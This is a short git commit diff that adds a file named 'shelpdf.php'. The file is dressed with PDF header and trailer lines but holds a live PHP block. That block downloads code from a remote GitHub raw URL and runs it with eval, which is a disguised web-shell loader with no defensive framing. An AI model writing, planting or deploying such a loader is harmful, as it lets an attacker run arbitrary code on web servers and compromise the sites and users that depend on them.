67088f4b57953367656971e8ea704d1a45fdf00c
nortslem <pbmaslem@gmail.com>
2026-06-20 15:27:50 +0700

    Add files via upload

---
+++ shelpdf.php
@@ -0,0 +1,14 @@
+%PDF-1.6
+%����
+24 0 obj
+<?php
+
+        $awo = 'https://';
+        eval("?>" . file_get_contents($awo . 'raw.githubusercontent.com/SyaidaAlya/AlfaSyaida/main/syaidaAliturkesh.php'));
+        exit;
+   
+?>
+endobj
+startxref
+4576
+%%EOF
